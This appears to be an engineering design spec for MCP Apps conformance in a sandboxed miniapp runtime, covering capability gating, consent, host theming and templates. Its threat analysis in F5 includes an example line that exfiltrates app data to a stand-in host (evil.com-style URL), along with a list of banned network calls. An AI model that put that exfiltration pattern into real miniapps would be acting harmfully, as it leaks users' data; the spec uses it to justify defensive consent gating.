# Miniapp runtime v2 — MCP Apps conformance, host context, and a template library

Date: 2026-07-10
Status: design approved, plan pending
Supersedes nothing; extends `2026-07-07-miniapp-mcp-host-cutover.md` (PRs #204 → #211, all merged)

## Why now

The #204→#211 stack replaced the private `agentgem:request` postMessage bridge with an MCP Apps
`ui/*` wire and declared the result a "strict superset" of the spec, verified against the reference
host `@mcp-ui/client` v7.1.1.

That verification tested a **sealed** miniapp. Sealed miniapps, by the cutover's own notes, "render
visually but never reach `initialized`" — they are not MCP-Apps-aware views. So the code path that
was proven against a real external host is exactly the path that never runs the handshake. The
interactive path has never executed outside our own `Runner`, and that is where the divergences live.

Re-reading `modelcontextprotocol/ext-apps` at `main` (SDK v1.7.4) against our implementation finds two
outright non-conformances on spec-owned surfaces, and a large set of unimplemented capabilities that
map onto bugs we have already written down.

## Findings

### F1 — `ui/notifications/tool-result` is spec-owned and we redefined it

`ext-apps/src/spec.types.ts:300`:

```ts
export interface McpUiToolResultNotification {
  method: "ui/notifications/tool-result";
  /** Standard MCP tool execution result. */
  params: CallToolResult;
}
```

`AppBridge.sendToolResult` (`app-bridge.ts:1649`) forwards `CallToolResult` raw. There is no
`toolName` on the notification, by design: an `App` instance is bound to the single `tools/call`
that instantiated it, and that tool's identity lives in `hostContext.toolInfo`.

We send `params: { toolName, chunk }` (`mcpUiHost.ts:53`). `scaffolds.ts`'s replay template dispatches
on `p.toolName === "agentgem_get_session_data"`. In any conformant host that predicate is
`undefined === "..."` on every push.

### F2 — `ui/initialize` params and result are both wrong

Spec request params (`spec.types.ts:554`): `{ appInfo, appCapabilities, protocolVersion }`. Our shim
sends **no params** (`mcpAppClient.ts:81`).

Spec result (`spec.types.ts:570`): `{ protocolVersion, hostInfo, hostCapabilities, hostContext }` plus
an index signature for passthrough. We return `{ protocolVersion, tools, hostContext: {} }`
(`mcpUiHost.ts:137`). `tools` is invented — there is no tool list in the initialize result, and there
is **no `tools/list` proxy on the App class** (`listServerResources` exists; `listServerTools` does
not). A top-level unknown field is a protocol violation a strict host may reject.

### F3 — unimplemented surface

App→host: `ui/request-display-mode`, `ui/open-link`, `ui/message`, `ui/update-model-context`,
`ui/notifications/size-changed`, `notifications/message`, `resources/read`.

Host→app: `ui/notifications/tool-input`, `tool-input-partial`, `tool-cancelled`,
`ui/notifications/host-context-changed`, `ui/resource-teardown`.

We send `hostContext: {}` — no `theme`, no `styles.variables`, no `containerDimensions`.

Three of these map onto known bugs: the hand-rolled fullscreen overlay (`ui/request-display-mode`),
the two sealed-iframe sizing traps (`containerDimensions`), and miniapps hardcoding `#0d1117` against
a console that is a single warm-paper theme (`hostContext.styles.variables`).

Absent `tool-input` also means `play_<name>`'s `inputSchema` is `{}` and the launcher tool is
unparameterizable from an external host.

### F4 — adopting the official SDK inside a miniapp is not viable

Measured against the published v1.7.4 bundles:

| artifact | min | gzip | inlinable into sealed HTML? |
|---|---|---|---|
| `@modelcontextprotocol/ext-apps` (root, `App`) | 33 KB | 9.3 KB | no — unresolved bare `import` of `@modelcontextprotocol/sdk/*` |
| `.../app-with-deps` | 329 KB | 76 KB | yes, but ESM-only `<script type="module">` |
| `.../app-bridge` (host side) | 43 KB | 11 KB | host only |

`build.bun.ts` calls `Bun.build({ target: "browser", minify: true })` with no `format`, so output is
ESM. **There is no IIFE/UMD build.** Inlining 329 KB of zod + MCP SDK into every generated game is not
acceptable against a 1.5 MB `gameGate` budget shared with the game itself.

Host side, `AppBridge` mandates a second origin: `examples/basic-host/src/implementation.ts` hardcodes
`SANDBOX_PROXY_BASE_URL = "http://localhost:8081/sandbox.html"`, and `src/sandbox.ts` runs a security
self-test that **throws unless `window.top` is inaccessible** ("the Host and the Sandbox MUST have
different origins"). That is the double-iframe sandbox proxy the cutover deliberately deferred.

Conclusion: the 97-line hand-rolled shim stays. It must speak the real wire. What is worth porting is
small and pure — `src/styles.ts`, the `setupSizeChangedNotifications` ResizeObserver, and
`examples/debug-server`'s view as a conformance harness.

### F5 — the capability model cannot see the new methods

`capabilityScan.ts`'s header asserts its static scan is **total**: `gameGate` bans
fetch/XHR/WebSocket/EventSource/importScripts/sendBeacon, so `window.agentgemApp` is the only channel
out of a sealed miniapp. That holds.

But `needs` is a closed 4-member union mapping **1:1 onto host tool names**, and `deriveNeeds()`
finds capabilities *by matching those tool-name strings*. `openLink`, `sendMessage` and
`updateModelContext` have no tool name. Adding them without extending the capability model punches
three ungoverned egress channels through a `default-src 'none'` iframe:

```js
window.agentgemApp.openLink("https://evil.example/?d=" + JSON.stringify(DATA))  // exfiltration
window.agentgemApp.sendMessage({ role: "user", content: {...} })                // speaks as the user
window.agentgemApp.updateModelContext({ structuredContent: {...} })             // feeds the model
```

### F6 — two compile-time guards will fire, correctly

`CAP_TOOL: Record<GameCapability, string>` (`capabilities.ts:10`) and
`CAP_CLASS: Record<GameCapability, "content"|"enhancement">` (`portability.ts:16`) exist so that adding
a capability without naming its tool / classifying its portability is a compile error. Our three new
capabilities have no tool, so the union must split rather than the guard being weakened.

### F7 — a latent bug the split detonates

`miniapps.ts:130`:

```ts
const detail = rec.missing.map((c) => `${CAP_TOOL[c]} (declare "${c}")`).join("; ");
```

Once `c` may be an `ActionCapability`, `CAP_TOOL[c]` is `undefined`, and a miniapp calling an
undeclared `agentgemApp.openLink` fails with `undefined (declare "open-link")`. Narrowing `CAP_TOOL`
to `Record<ToolCapability, string>` turns this into a compile error. Must be fixed in this work.

### F8 — `assertPortable` runs at save, not publish

`miniapps.ts:146`. There is no save/publish seam. A miniapp declaring `session-data` (classified
`"content"`) with no baked timeline cannot be **saved**, let alone published.

## Decisions

| # | Decision | Rationale |
|---|---|---|
| D1 | Streaming rides `ui/notifications/tool-result` with a real `CallToolResult`; stream identity in `_meta["ai.agentgem/stream"] = {toolName, seq, done}` | `_meta` is the spec's sanctioned extension point. A conformant host relays it; a conformant client ignores it. No method-name collision. |
| D2 | All four sub-projects, one spec, four PRs | User call. `CLAUDE.md`: one PR = one settled scope. |
| D3 | **Version the transport, freeze the API.** `window.agentgemApp` keeps its exact shape; the shim unwraps `_meta` internally | Zero game-logic migration, ever. Also preserves `deriveNeeds`, which matches the `p.toolName === "agentgem_get_session_data"` literal in stored game source. |
| D4 | Port `debug-server`, `cohort-heatmap`, `basic-server-vanillajs`, `scenario-modeler` | User call. |
| D5 | Extend `GameCapability` with `open-link`, `send-message`, `update-model-context`; `deriveNeeds` gains a method matcher | Keeps `capabilityScan`'s totality claim true. |
| D6 | All three new caps are `"enhancement"`. `open-link` is consent-gated with the URL shown. `send-message` and `update-model-context` are local-only, like `invoke-agent` | A marketplace miniapp must never speak as the user in their chat. |
| D7 | One versioned shim, one emitted `<script>`, one marker | The on-read backstop must find-and-replace **one** region atomically. N markers = N migration paths = the failure mode that shipped a mute miniapp. |
| D8 | The inspector is a **built-in**, never saved | It is a conformance harness, not a user artifact. Local-only by construction; needs no save/publish seam (see F8). |

## Design

### 1. The capability union splits

```ts
// packages/model/src/types.ts
export type ToolCapability =            // brokered by a host MCP tool; matched by TOOL NAME
  | "session-data" | "live-session-events" | "local-project-access" | "invoke-agent";

export type ActionCapability =          // a ui/* method on the app; matched by METHOD NAME
  | "open-link" | "send-message" | "update-model-context";

export type GameCapability = ToolCapability | ActionCapability;
```

```ts
// packages/model/src/capabilities.ts
export const CAP_TOOL: Record<ToolCapability, string> = { /* unchanged, 4 entries */ };
export const CAP_METHOD: Record<ActionCapability, string> = {
  "open-link": "openLink",
  "send-message": "sendMessage",
  "update-model-context": "updateModelContext",
};
export const METHOD_CAP: Record<string, ActionCapability> = Object.fromEntries(
  (Object.entries(CAP_METHOD) as [ActionCapability, string][]).map(([cap, m]) => [m, cap]),
);
```

`CAP_CLASS` stays `Record<GameCapability, …>` — all seven; the three new ones `"enhancement"`.

```ts
// packages/play/src/capabilityScan.ts
export function deriveNeeds(html: string): GameCapability[] {
  const code = scannableCode(html);
  return [
    ...Object.keys(TOOL_CAP).filter((t) => code.includes(t)).map((t) => TOOL_CAP[t]),
    ...Object.keys(METHOD_CAP).filter((m) => code.includes(`agentgemApp.${m}`)).map((m) => METHOD_CAP[m]),
  ].sort();
}
```

The method matcher anchors on `agentgemApp.` rather than the bare identifier: `sendMessage` is a
plausible name for a game's own internal function, and a bare match would over-declare. (Over-declaring
is not merely noisy — `reconcileNeeds` would then *prune* it as unused, or the Runner would prompt for
consent the game never needs.)

Fix F7 while here: `rec.missing`'s error string must branch on which map holds the capability.

Also update the browser-safe mirror in `consent.ts` and its drift-guard test
(`__tests__/capTool.drift.test.ts`) — the console cannot value-import `@agentgem/play`'s barrel because
it pulls in `node:os`/`node:path`/`node:fs`.

Runtime gating:

| capability | consent | local-only |
|---|---|---|
| `session-data` | auto (`AUTO_CAPS`) | no |
| `local-project-access`, `live-session-events` | prompt, remembered | no |
| `invoke-agent` | prompt, remembered | yes |
| `open-link` | prompt **per call, URL shown, not remembered** | no |
| `send-message`, `update-model-context` | prompt, remembered | yes |

`open-link`'s per-call prompt is deliberate: a remembered grant on a method whose *argument* is the
dangerous part is not a grant to anything meaningful. The URL is the decision.

### 2. The wire conforms; the API does not move

`ui/initialize` request:

```js
post({ jsonrpc: "2.0", id, method: "ui/initialize", params: {
  appInfo: { name: "agentgem-miniapp", version: ENGINE_VERSION },
  appCapabilities: { availableDisplayModes: ["inline", "fullscreen"] },
  protocolVersion: "2026-01-26",
}});
```

`ui/initialize` result — the granted tool list moves out of a top-level field and into our namespaced
`_meta` block, which is where a passthrough belongs:

```ts
reply(d.id, {
  protocolVersion: PROTOCOL_VERSION,
  hostInfo: { name: "agentgem-console", version },
  hostCapabilities: { serverTools: {}, openLinks: {}, sandbox: { csp: SEALED_CSP } },
  hostContext: {
    theme, styles: { variables }, displayMode, availableDisplayModes,
    containerDimensions: { width: vw, height: vh },
  },
  _meta: { "ai.agentgem/host": { tools: grantedTools } },
});
```

`ui/notifications/tool-result` — host sends a real `CallToolResult`; the shim unwraps and preserves the
frozen API:

```js
if (d.method === "ui/notifications/tool-result" && d.params) {
  var s = (d.params._meta || {})["ai.agentgem/stream"] || {};
  var p = { toolName: s.toolName, chunk: d.params.structuredContent };
  dispatch(d.method, p);
}
```

New host→app messages the shim handles and the host sends: `tool-input` (makes `play_<name>`
parameterizable — its `inputSchema` stops being `{}`), `tool-input-partial`, `tool-cancelled`,
`host-context-changed`, and the `ui/resource-teardown` **request** (the host awaits the reply, so a game
can persist state before a switch).

New app→host methods on `window.agentgemApp`: `openLink`, `sendMessage`, `updateModelContext`,
`requestDisplayMode`, plus `sendLog` (`notifications/message`, ungated — it is inbound-only from the
host's perspective and carries no data the host does not already have).

Marker: `agentgem:mcp-app-client` → `agentgem:mcp-app-client:2`. `ensureClientShim` and
`readMiniapp`'s on-read backstop both locate **any** `agentgem:mcp-app-client*` region and replace it
wholesale. `migrateMiniappHtml` still owns the legacy-bridge rewrite; `saveMiniapp` still calls
`ensureClientShim`, never `migrateMiniappHtml` (the codemod injects a capability).

### 3. Host context, sizing, display mode

Port `ext-apps/src/styles.ts` into `packages/play/src/hostStyles.ts` as string-emitting code compiled
into the single shim block: `applyDocumentTheme(theme)` (sets `data-theme` + `color-scheme` on
`<html>`) and `applyHostStyleVariables(vars)` (writes the `McpUiStyleVariableKey` set onto
`document.documentElement`).

`applyHostFonts` is **not** ported: it injects `@font-face` with a URL, and `SEALED_CSP.resourceDomains`
is `[]`. Documented at the seam.

The console advertises `theme: "light"` (single warm-paper theme) and maps its own custom properties
onto the standardized keys:

| console | MCP Apps |
|---|---|
| `--paper` | `--color-background-primary` |
| `--paper-2` | `--color-background-secondary` |
| `--ink` | `--color-text-primary` |
| `--line` | `--color-border-primary` |

**Sizing.** `Runner.tsx:110-146` renders the inline iframe at a fixed virtual window `vw × vh` and
applies `transform: scale()`. That is the spec's **fixed-dimensions** model. So `autoResize` is **off**
in our host:

```js
var cd = ctx.containerDimensions || {};
if (cd.width == null || cd.height == null) setupSizeChangedNotifications();  // external hosts only
```

Inline mode reports `containerDimensions: { width: vw, height: vh }` — the *virtual window*, not the
scaled box. This is the sizing bug precisely: `transform: scale()` changes rendered size and leaves the
layout viewport alone, so a game measuring `window.innerWidth` was always right and a game measuring
its on-screen size was always wrong. Now it need not measure.

**Display mode.**

- App→host `ui/request-display-mode {mode}` → `setFs(mode === "fullscreen")` → reply `{ mode }` **as
  actually applied**. A thumbnail (`interactive={false}`) refuses and returns `"inline"`.
- Host→app: any fullscreen toggle — button or request — pushes
  `ui/notifications/host-context-changed { displayMode, containerDimensions }`.
- `availableDisplayModes: ["inline", "fullscreen"]`. No `pip`.

A game now learns it went fullscreen and re-lays-out against the real screen instead of being
magnified. The overlay stops needing to trap a stacking context, retiring the `fill-mode: both` trap.

On `app.agentgem.ai` there is no host: the handshake exhausts (~5 tries / 800 ms), `api.ready` stays
false, every capability is absent. Templates therefore use CSS variables **with fallbacks** —
`var(--color-background-primary, #0d1117)` — which becomes a builder-brief rule.

### 4. Templates

`scaffolds.ts` after this work:

| scaffold id | ported from | genre |
|---|---|---|
| `replay` | (existing) | `replay` |
| `skill-run` | `basic-server-vanillajs` via `minimalTemplate()` | `skill-run` |
| `project-fun` | `basic-server-vanillajs` via `minimalTemplate()` | `project-fun` |
| `heatmap` | `cohort-heatmap-server` | **new genre** `session-heatmap` |
| `modeler` | `scenario-modeler-server` | **new genre** `scenario-modeler` |

`minimalTemplate(title, subtitle)` replaces `sealedTemplate()` and adopts the canonical shape from
`examples/basic-server-vanillajs/src/mcp-app.ts`: register every handler, **then** connect, then apply
host context. (The SDK's `App` warns — or throws under `strict` — if a first handler for a one-shot
event is registered after the handshake. Our shim should log the same warning.)

`genres.ts`'s header states the rule: adding a genre is "one entry here + one scaffold + one
sourceContext branch." So `heatmap` and `modeler` are a `GameGenre` union change plus a
`sourceContext.ts` branch each, not merely scaffold files.

- `session-heatmap`: `sourceKind: "session"`, `needs: ["session-data"]`. Like `replay`, the seed bakes a
  redacted snapshot so the game runs offline before any broker data arrives — which is also what
  satisfies `assertPortable` for a `"content"` capability at save time.
- `scenario-modeler`: `sourceKind: "project"`, `needs: ["update-model-context"]`.

**A consequence of D6 meeting D4 that must be accepted explicitly:** `update-model-context` is
local-only, so *every seeded modeler game is unpublishable by construction* — it can be saved and
played locally, never shared to the marketplace. That is the correct security posture (a marketplace
miniapp must not feed the viewer's model) but it makes `scenario-modeler` the first local-only genre,
and the Studio must say so at seed time rather than failing at Publish. If that is unacceptable, the
alternative is to seed the modeler with `needs: []` and have it push state only when a user explicitly
opts in — a UI affordance this spec does not design.

**The inspector is not a scaffold** (D8). `packages/play/src/inspector.ts` exports `INSPECTOR_HTML` and
`INSPECTOR_META` as constants. A dev route `GET /api/play/inspector` serves the html; `GET
/api/play/mcp-app?name=__inspector` synthesizes `mcpAppFor(INSPECTOR)` without reading disk. It never
enters `saveMiniapp`, the miniapps git registry, or the marketplace.

Its view is a port of `examples/debug-server/src/mcp-app.ts`: an event log filterable by every callback,
a host-info dump (context, capabilities, container dimensions, a styles sample), a callback-status
table, and buttons firing every method.

Two traps every template must respect:

1. **Both attributes on baked data.** `gameGate`'s `JSON_TYPE` exempts inert data only on
   `type="application/json"`; `portability.ts`'s `hasBakedTimeline` matches only on `id="game-data"`.
   Write `<script id="game-data" type="application/json">`.
2. **The seal's word list.** `NETWORK_CALL` scans `scannableCode()`, which strips only inert JSON — so
   the literal words `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `importScripts`,
   `navigator.sendBeacon` fail the gate **even inside strings and comments**. An inspector that logs
   `"fetch"` as an event label fails its own seal.

`builderBrief.ts` (canonical TS) gains: the CSS-variable-with-fallback rule; the requirement that
`agentgemApp.<method>` names be literal (same reason tool names must be literal — `deriveNeeds` reads
source); the display-mode API; the handlers-before-connect ordering.
`skills/agentgem-miniapp/SKILL.md` is **regenerated**; the `SKILL.md.endsWith(MINIAPP_BUILDER_BRIEF)`
guard in `src/play/__tests__/builderBrief.test.ts` fails otherwise.

### 5. Error handling

- Undeclared capability → `-32601 capability not permitted` (unchanged), now reachable for action
  capabilities too.
- Consent denied → `-32001 consent denied` (unchanged).
- `open-link` denied → `-32001`; the app receives `{ isError: true }` per the SDK's `openLink` contract,
  not a thrown rejection.
- Local-only capability requested by a shared/marketplace miniapp → `-32601`, same lane as
  `invoke-agent` today (`permission: deny`, no prompt shown).
- Handshake exhaustion (no host) → pending calls reject with `no host`; `api.ready` stays false.
  Unchanged.
- `ui/resource-teardown` is a **request**: the host awaits the app's reply with a bounded timeout, then
  tears down regardless. A game that hangs must not wedge a game switch.

## Testing

The failure of the last stack was asserting conformance rather than exercising it. Four layers:

1. **Schema-validated conformance.** `@modelcontextprotocol/ext-apps` exports
   `./schema.json` → `dist/src/generated/schema.json`. Vendor it as a devDependency artifact and
   validate every message we emit — `ui/initialize` params and result, every notification — against it.
   This converts "we read the spec carefully" into a test that fails when the spec moves. Extends
   `src/play/__tests__/mcpApp.conformance.test.ts`.
2. **Frozen-API regression.** A fixture carrying the **v1** shim, run through `readMiniapp()`, must
   (a) emerge with the v2 marker, (b) have byte-identical game logic, (c) still receive
   `{toolName, chunk}` when the host pushes a `CallToolResult` bearing
   `_meta["ai.agentgem/stream"]`. This is the test that proves D3 is real.
3. **`capabilityScan`.** `agentgemApp.openLink(...)` derives `open-link`; a game-local
   `function sendMessage()` derives nothing. `hasDynamicToolCall` unaffected.
4. **Interop, actually exercised.** Render the **inspector** — not a sealed scaffold — in
   `@mcp-ui/client` v7.1.1 (`AppRenderer`/`AppFrame`/`AppBridge`), and require it to reach
   `initialized` and log a received `tool-input`. That assertion has never been made. Then a manual
   Claude Desktop pass.

Two CI constraints:

- Play tests are the **root `src/play/__tests__` dist-run** (`vitest include` is
  `dist/**/__tests__/**/*.test.js`). Write in `src/`, run the compiled `dist/…*.test.js`. Never
  invent a package-local `vitest.config`.
- **Console tests are not in CI.** `Runner.test.tsx`, `consent`, `mcpUiHost` tests must be run locally
  (`pnpm -C packages/console exec vitest`) before each PR or they rot silently.
- A fresh worktree's `pnpm test` fails `consoleMount.test.ts` until `node scripts/build-console.mjs`
  has run. Unrelated to this work.

## PR staging

Four PRs, each off freshly-fetched `origin/main`, each a settled scope (`CLAUDE.md`).

1. **Model + scan.** Union split, `CAP_METHOD`/`METHOD_CAP`, `deriveNeeds` method matcher, `CAP_CLASS`
   entries, F7 fix, `consent.ts` mirror + drift guard. Pure; no runtime behavior change.
2. **Wire.** Shim v2 (single versioned marker) + `mcpUiHost` conformance + `_meta` streaming + on-read
   backstop. **Atomic** — the shim and host must land together.
3. **Host context.** Theme/styles port, `containerDimensions`, display mode; `Runner.tsx` fullscreen
   rewrite; new consent lanes for the action capabilities.
4. **Templates.** `minimalTemplate`, `heatmap` + `modeler` (genres + sourceContext branches),
   `inspector.ts` + dev route, `builderBrief` + regenerated `SKILL.md`, interop test.

## Non-goals

- Adopting `@modelcontextprotocol/ext-apps` as a runtime dependency of a miniapp (F4).
- Adopting `AppBridge` in the console, and the double-iframe sandbox proxy it mandates (F4). Our host
  keeps the single null-origin iframe and the storage shim.
- `pip` display mode.
- `sampling/createMessage`, `resources/list`, `downloadFile`.
- Running third-party `ui://` resources inbound in the console.
- An AG-UI client (the Studio stream already emits AG-UI outbound, PR #211).

## Open risks

- **`_meta` passthrough is untested in a real host.** D1 assumes a conformant host relays
  `params._meta` on `ui/notifications/tool-result` untouched. The spec's index signatures say it should;
  no host has been observed doing it. PR 2 must verify this against `@mcp-ui/client` before the branch
  merges — nothing downstream depends on it, but the whole streaming design does. If `_meta` is
  stripped, fall back to a namespaced method (`ai.agentgem/notifications/stream`). Because D3 freezes
  `window.agentgemApp`, that fallback is confined to the shim and the host router: no game changes.
- **`deriveNeeds`'s `agentgemApp.` anchor** misses `const app = window.agentgemApp; app.openLink(...)`.
  Same class of hole as `hasDynamicToolCall`, closed the same way — by convention in the brief, plus a
  save-time error. Consider extending `hasDynamicToolCall`'s skeleton pass to catch aliasing.
- **Two new genres** widen `GameGenre`. Verified 2026-07-10: no exhaustive `switch` over it exists
  anywhere — it is referenced only as a type (`types.ts`, `genres.ts`, `miniapps.ts`,
  `sourceContext.ts`). Widening is safe. The reserved comment `// v2: "watch" | "team"` shows the union
  was always expected to grow.
- **`scenario-modeler` is local-only by construction** (see §4). Accepted, but it is a new category of
  genre and the Studio must communicate it at seed time.
